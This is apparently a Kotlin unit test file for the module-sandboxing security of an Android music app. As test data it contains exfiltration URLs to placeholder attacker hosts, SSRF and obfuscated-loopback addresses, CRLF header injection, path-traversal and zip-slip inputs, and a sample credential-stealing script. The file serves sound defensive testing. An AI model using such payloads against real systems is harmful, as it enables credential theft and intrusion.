package com.mochyy.mochymusic.modules.security

import com.mochyy.mochymusic.module.HttpRequest
import com.mochyy.mochymusic.module.MatchedTrack
import com.mochyy.mochymusic.module.SourceStream
import com.mochyy.mochymusic.module.StreamFormat
import com.mochyy.mochymusic.utils.SecretVault
import okhttp3.OkHttpClient
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import java.io.ByteArrayOutputStream
import java.io.File
import java.net.InetAddress
import java.net.URLEncoder
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.io.encoding.Base64
import kotlin.io.encoding.ExperimentalEncodingApi

class ModuleSecurityTest {

    @Before
    fun setUp() {
        SecretVault.useTestKey(ByteArray(32) { (it * 7 + 3).toByte() })
        SecretGuard.clear("test_yt")
        SecretGuard.clear("test_webdav")
        SecretGuard.registerBlockedUrl("test_webdav_host", null)
    }

    @After
    fun tearDown() {
        SecretVault.useTestKey(null)
        SecretGuard.clear("test_yt")
        SecretGuard.clear("test_webdav")
        SecretGuard.registerBlockedUrl("test_webdav_host", null)
    }

    @Test
    fun vaultDomainIsolationAndTamperCheck() {
        val sealed = SecretVault.seal("super-secret-webdav-pass", SecretVault.CloudBackupDomain)
        assertTrue(sealed.startsWith("enc2:"))
        assertFalse(SecretVault.needsUpgrade(sealed))
        assertEquals("super-secret-webdav-pass", SecretVault.open(sealed, SecretVault.CloudBackupDomain))
        // ciphertext moved to another domain must fail to open
        assertNull(SecretVault.open(sealed, "module:evil"))
        // flipped byte must fail gcm auth
        val tampered = sealed.dropLast(1) + if (sealed.last() == 'A') 'B' else 'A'
        assertNull(SecretVault.open(tampered, SecretVault.CloudBackupDomain))
    }

    @OptIn(ExperimentalEncodingApi::class)
    @Test
    fun secretGuardCatchesRawEncodedAndCookieFragments() {
        val ytCookie = "PREF=tz=Asia.Jakarta; SAPISID=abcDEF1234567890/xyz; __Secure-3PSID=g.a000VerySecretTokenValue123"
        val webdavPass = "MySuperWebDavPass!2026"
        SecretGuard.register("test_yt", ytCookie)
        SecretGuard.register("test_webdav", webdavPass)
        SecretGuard.registerBlockedUrl("test_webdav_host", "https://dav.myhome.example/remote.php/dav")

        assertTrue(SecretGuard.containsSecret("https://evil.example/?c=abcDEF1234567890/xyz"))
        assertTrue(SecretGuard.containsSecret("https://evil.example/?c=${URLEncoder.encode(webdavPass, "UTF-8")}"))
        assertTrue(SecretGuard.containsSecret("payload=${Base64.encode(webdavPass.toByteArray())}"))
        assertTrue(SecretGuard.isBlockedHost("dav.myhome.example"))
        assertTrue(SecretGuard.isBlockedHost("sub.dav.myhome.example"))
        assertTrue(SecretGuard.isBlockedHost("mochy-module-feed.mochyy.workers.dev"))
        assertFalse(SecretGuard.isBlockedHost("api.github.com"))

        assertTrue(SecretGuard.looksLikeSecretProbe("innerTubeCookie"))
        assertTrue(SecretGuard.looksLikeSecretProbe("webdav_password"))
        assertTrue(SecretGuard.looksLikeSecretProbe("../settings"))
        assertFalse(SecretGuard.looksLikeSecretProbe("last_checked_at"))
    }

    @Test
    fun urlGuardBlocksSsrfAndSneakyIps() {
        val bad = listOf(
            "file:///data/data/com.mochyy.mochymusic/files/datastore/settings.preferences_pb",
            "content://com.android.contacts/data",
            "javascript:alert(1)",
            "intent://evil/#Intent;end",
            "http://localhost:8080/secret",
            "http://127.0.0.1:41821/library",
            "http://[::1]:8080/",
            "http://[::ffff:127.0.0.1]/",
            "http://0.0.0.0/",
            "http://10.0.0.1/admin",
            "http://172.16.5.2/dav",
            "http://192.168.1.1/router",
            "http://169.254.169.254/latest/meta-data/",
            "http://100.64.0.1/",
            "http://2130706433/",
            "http://0x7f000001/",
            "http://0177.0.0.1/",
            "https://user:pass@example.com/api",
            "https://mochy-module-feed.mochyy.workers.dev/modules",
        )
        bad.forEach { url ->
            assertFalse("expected blocked: $url", ModuleUrlGuard.isSafeRemoteUrl(url))
        }
        assertTrue(ModuleUrlGuard.isSafeRemoteUrl("https://api.monochrome.st/search?q=test"))
        assertTrue(ModuleUrlGuard.isBlockedAddress(InetAddress.getByName("127.0.0.1")))
        assertTrue(ModuleUrlGuard.isBlockedAddress(InetAddress.getByName("192.168.0.5")))
        assertFalse(ModuleUrlGuard.isBlockedAddress(InetAddress.getByName("1.1.1.1")))
    }

    @Test
    fun sandboxGreetsExfilAndLocalhostWithLol() {
        SecretGuard.register("test_webdav", "TopSecretWebDav999")
        val client = OkHttpClient()

        val exfil = ModuleUrlGuard.executeSandboxed(
            client,
            "shady-mod",
            HttpRequest("https://attacker.example/steal?p=TopSecretWebDav999"),
        )
        assertEquals(403, exfil.code)
        assertTrue(exfil.text.contains("lol"))

        val ssrf = ModuleUrlGuard.executeSandboxed(
            client,
            "shady-mod",
            HttpRequest("http://127.0.0.1:8080/internal"),
        )
        assertEquals(403, ssrf.code)
        assertTrue(ssrf.text.contains("lol"))
    }

    @Test
    fun streamSanitizerBlocksFileUrlsAndCrlfHeaders() {
        val matched = MatchedTrack("1", "Song", "Artist", null, 180_000, 0.9f)
        val evilFile = SourceStream("file:///etc/hosts", StreamFormat.Progressive, emptyMap(), null, "mod", "FLAC", matched)
        assertNull(ModuleUrlGuard.sanitizeStream(evilFile))

        SecretGuard.register("test_yt", "SAPISID=SecretCookie123456")
        val goodUrlWithBadHeaders = SourceStream(
            url = "https://cdn.example.com/song.flac",
            format = StreamFormat.Progressive,
            headers = mapOf(
                "Referer" to "https://cdn.example.com",
                "X-Evil" to "abc\r\nInjected: yes",
                "X-Steal" to "SecretCookie123456",
                "Host" to "spoofed.example",
            ),
            sourceLabel = "mod",
            qualityLabel = "FLAC",
            matched = matched,
        )
        val cleaned = ModuleUrlGuard.sanitizeStream(goodUrlWithBadHeaders)
        assertNotNull(cleaned)
        assertEquals(mapOf("Referer" to "https://cdn.example.com"), cleaned!!.headers)
    }

    @Test
    fun sanitizerPreventsPathTraversalAndBadIds() {
        assertNotEquals("..", ModuleSanitizer.safeSegment(".."))
        assertNotEquals(".", ModuleSanitizer.safeSegment("."))
        assertFalse(ModuleSanitizer.safeSegment("../../etc").contains(".."))

        val root = File(System.getProperty("java.io.tmpdir"), "mochy-sec-test")
        assertNull(ModuleSanitizer.safeChild(root, ".."))
        assertNull(ModuleSanitizer.safeChild(root, "a/../b"))
        assertNotNull(ModuleSanitizer.safeChild(root, "clean-mod", "1234"))

        assertFalse(ModuleSanitizer.isValidModuleId(".."))
        assertFalse(ModuleSanitizer.isValidModuleId("youtube"))
        assertFalse(ModuleSanitizer.isValidModuleId("a/b"))
        assertTrue(ModuleSanitizer.isValidModuleId("js.addons-1"))

        assertNull(ModuleSanitizer.safeNavArg("../settings"))
        assertNull(ModuleSanitizer.safeNavArg("abc?foo=bar"))
        assertEquals("PL123_abc-9", ModuleSanitizer.safeNavArg("PL123_abc-9"))
    }

    @Test
    fun scriptScannerBlocksShadyScriptsAndAllowsCleanOnes() {
        val clean = """
            export async function searchTracks(q) {
              const r = await fetch("https://music.example.com/search?q=" + encodeURIComponent(q));
              return r.json();
            }
        """.trimIndent().toByteArray()
        assertEquals(ScriptVerdict.Clean, ScriptSecurityScanner.scanBytes("good.js", clean).verdict)

        val warn = """
            export async function searchTracks(q) {
              const fn = eval("1+1");
              return fetch("http://plain.example.com/s?q=" + q);
            }
        """.trimIndent().toByteArray()
        assertEquals(ScriptVerdict.Warn, ScriptSecurityScanner.scanBytes("sketchy.js", warn).verdict)

        val evil = """
            export async function searchTracks() {
              const res = await fetch("http://127.0.0.1:41821/dump");
              const secret = "innerTubeCookie";
              return res.json();
            }
        """.trimIndent().toByteArray()
        val blocked = ScriptSecurityScanner.scanBytes("stealer.js", evil)
        assertEquals(ScriptVerdict.Blocked, blocked.verdict)
        assertTrue(blocked.findings.any { it.blocked })

        val badZip = ByteArrayOutputStream().apply {
            ZipOutputStream(this).use { z ->
                z.putNextEntry(ZipEntry("../evil.js"))
                z.write("console.log('hi')".toByteArray())
                z.closeEntry()
            }
        }.toByteArray()
        assertEquals(ScriptVerdict.Blocked, ScriptSecurityScanner.scanBytes("bad.zip", badZip).verdict)
    }

    @Test
    fun surfaceSessionClampsDimensionsAndRedactsErrors() {
        SecretGuard.register("test_webdav", "SuperSecretPass2026")
        assertEquals(640 to 480, com.mochyy.mochymusic.ui.player.styles.SurfaceSession.clampDimensions(99999, 99999))
        assertEquals(64 to 64, com.mochyy.mochymusic.ui.player.styles.SurfaceSession.clampDimensions(-5, 0))
        val error = com.mochyy.mochymusic.ui.player.styles.SurfaceSession.sanitizeError("failed reading SuperSecretPass2026\n\r\t" + "x".repeat(300))
        assertFalse(error.contains("SuperSecretPass2026"))
        assertFalse(error.contains("\n"))
        assertTrue(error.length <= 200)
    }

    @Test
    fun shaderSecurityGuardBlocksDoSAndAllowsCleanAgsl() {
        val clean = """
            // simple ambient wave
            uniform float2 size;
            uniform float time;
            half4 main(float2 p) {
                float acc = 0.0;
                for (int i = 0; i < 12; i++) {
                    acc += sin(p.x * 0.01 + time + float(i));
                }
                return half4(acc * 0.05, 0.2, 0.5, 1.0);
            }
        """.trimIndent()
        assertNull(ShaderSecurityGuard.validate(clean))

        // unbounded loops
        assertNotNull(ShaderSecurityGuard.validate("half4 main(float2 p){ while(true){} return half4(0); }"))
        assertNotNull(ShaderSecurityGuard.validate("half4 main(float2 p){ do { p.x += 1.0; } while(p.x < 10.0); return half4(0); }"))
        assertNotNull(ShaderSecurityGuard.validate("half4 main(float2 p){ for(;;){} return half4(0); }"))
        // excessive loop iteration count
        assertNotNull(ShaderSecurityGuard.validate("half4 main(float2 p){ for(int i=0;i<500;i++){} return half4(0); }"))
        // preprocessor directive
        assertNotNull(ShaderSecurityGuard.validate("#include <secret>\nhalf4 main(float2 p){ return half4(0); }"))
        // excessive texture sampling
        val manyEvals = "uniform shader s;\nhalf4 main(float2 p){ half4 c = half4(0);\n" +
            (1..35).joinToString("\n") { "c += s.eval(p);" } + "\nreturn c; }"
        assertNotNull(ShaderSecurityGuard.validate(manyEvals))
        // control characters
        assertNotNull(ShaderSecurityGuard.validate("half4 main(float2 p){ return half4(0); }\u0000"))
        // comments with words like while or #include should not trigger false positives
        val commented = "/* while(true) #include <x> */\nhalf4 main(float2 p){ return half4(1); }"
        assertNull(ShaderSecurityGuard.validate(commented))
    }

    @Test
    fun safeModuleRoutesBlocksSensitiveAndAllowsSafeRoutes() {
        val allowed = listOf(
            "home", "search_input", "library", "library/songs", "library/playlists",
            "history", "stats", "mochy_settings", "settings", "audio_lab", "equalizer",
            "customisation_settings", "modules", "module_browser",
            "album/MPREb_123", "artist/UCabc-9", "local_playlist/pl_1", "online_playlist/PL99",
            "auto_playlist/liked", "auto_playlist/downloaded", "cache_playlist/cached", "top_playlist/50",
        )
        allowed.forEach { route ->
            assertNotNull("expected allowed: $route", SafeModuleRoutes.sanitize(route))
        }
        assertEquals("mochy_settings", SafeModuleRoutes.sanitize("settings"))
        assertEquals("auto_playlist/liked", SafeModuleRoutes.sanitize("liked"))

        val blocked = listOf(
            "youtube_login", "youtube_sync", "backup", "proxy_settings", "cipher_settings",
            "account_import", "import_sync", "discord", "scrobble_service/lastfm",
            "experimental_settings", "playback_diagnostics", "dev_playground",
            "../backup", "album/foo?bar=1", "javascript:alert(1)", "http://evil.example",
            "top_playlist/99999", "auto_playlist/evil", "unknown_secret_route",
        )
        blocked.forEach { route ->
            assertNull("expected blocked: $route", SafeModuleRoutes.sanitize(route))
        }

        assertTrue(SafeModuleRoutes.isSensitiveRoute("youtube_login"))
        assertTrue(SafeModuleRoutes.isSensitiveRoute("backup"))
        assertTrue(SafeModuleRoutes.isSensitiveRoute("proxy_settings"))
        assertTrue(SafeModuleRoutes.isSensitiveRoute("modules"))
        assertTrue(SafeModuleRoutes.isSensitiveRoute("module/applemusic"))
        assertFalse(SafeModuleRoutes.isSensitiveRoute("home"))
        assertFalse(SafeModuleRoutes.isSensitiveRoute("mochy_settings"))
    }

    @Test
    fun safeAppSettingsBlocksSecretsAndAllowsSafePreferences() {
        assertNotNull(SafeAppSettings.find("blur"))
        assertNotNull(SafeAppSettings.find("pureBlack"))
        assertNotNull(SafeAppSettings.find("floating_lyrics"))
        assertNotNull(SafeAppSettings.find("skipSilence"))
        assertNotNull(SafeAppSettings.find("blurStrength"))
        assertTrue(SafeAppSettings.byCategory("blur").isNotEmpty())
        assertTrue(SafeAppSettings.byCategory("playback").isNotEmpty())
        assertTrue(SafeAppSettings.byCategory("now_playing").size >= 10)

        val forbidden = listOf(
            "innerTubeCookie", "proxyPassword", "proxyUrl", "discordAccessToken",
            "openRouterApiKey", "disableScreenshot", "developerMode", "webdavPassword",
            "lastfmSessionKey", "visitorData", "accountEmail",
        )
        forbidden.forEach { key ->
            assertNull("expected forbidden setting: $key", SafeAppSettings.find(key))
        }
    }

    @Test
    fun moduleActionGuardRateLimitsAndBlocksSecretExfil() {
        ModuleActionGuard.resetForTests()
        val mod = "local.spammer"
        repeat(6) { i ->
            assertTrue("trigger $i should pass", ModuleActionGuard.allowTrigger(mod, nowMs = 10_000L + i * 50L))
        }
        assertFalse("7th trigger inside 1s should be throttled", ModuleActionGuard.allowTrigger(mod, nowMs = 10_400L))
        assertTrue("trigger after 1s window should pass again", ModuleActionGuard.allowTrigger(mod, nowMs = 11_200L))

        SecretGuard.register("test_yt", "SAPISID=TopSecretExfil9876")
        assertFalse(ModuleActionGuard.isSafeFinalUrl("https://evil.example/?s=TopSecretExfil9876"))
        assertFalse(ModuleActionGuard.isSafeFinalUrl("http://127.0.0.1:8080/ping"))
        assertTrue(ModuleActionGuard.isSafeFinalUrl("https://genius.com/search?q=hello"))
    }

    @Test
    fun zipBombCompressionRatioGuardCatchesBombs() {
        assertFalse(com.mochyy.mochymusic.modules.skin.SkinFiles.exceedsCompressionRatio(written = 500_000L, compressedSize = 100L))
        assertTrue(com.mochyy.mochymusic.modules.skin.SkinFiles.exceedsCompressionRatio(written = 2_000_000L, compressedSize = 10_000L))
        assertFalse(com.mochyy.mochymusic.modules.skin.SkinFiles.exceedsCompressionRatio(written = 2_000_000L, compressedSize = 1_000_000L))
    }

    @Test
    fun takeoverAllowlistNeverPermitsSensitiveScreens() {
        val allowed = com.mochyy.mochymusic.ui.screens.settings.modules.AllowedTakeovers
        assertTrue("mochy_settings" in allowed)
        assertTrue("artist" in allowed)
        assertTrue("library" in allowed)
        listOf(
            "modules", "module", "module_browser", "youtube_login", "youtube_sync",
            "backup", "proxy_settings", "cipher_settings", "discord", "scrobble_service",
            "experimental_settings", "playback_diagnostics", "account_import",
        ).forEach { sensitive ->
            assertFalse("sensitive route $sensitive must never be in AllowedTakeovers", sensitive in allowed)
        }
    }
}
